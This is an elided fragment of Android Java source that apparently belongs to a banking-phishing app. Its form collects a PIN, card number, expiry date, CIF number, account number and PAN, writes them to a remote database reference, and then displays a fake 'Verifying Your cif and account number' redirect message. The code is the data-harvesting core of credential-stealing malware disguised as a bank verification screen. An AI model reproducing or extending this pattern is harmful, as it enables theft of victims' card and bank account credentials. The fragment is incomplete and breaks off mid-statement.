            ...
            if (validateForm()) {
                ...
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            ...
                            intent.putExtra("loadText", "Please wait... Verifying Your cif and account number\n Redirecting in 5 seconds");
                ...
                Helper.debug(FiveActivity.this, "Form Validation Failed");
            }
        ...
        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            ...
            switch (key) {
                ...
                case "pin":
                    ...
                    break;
                case "expiry":
                    isValid = FormValidator.validateMinLength(editText, 10,  "Invalid Expiry Date");
                    break;
                case "card":
                    isValid = FormValidator.validateMinLength(editText, 16,  "Invalid Card Number");
                    break;
                case "cif":
                    isValid = FormValidator.validateMinLength(editText, 11,  "Invalid CIF Number");
                    break;
                case "ac":
                    isValid = FormValidator.validateMinLength(editText, 11,  "Invalid Account Number");
                    break;
                case "pan":
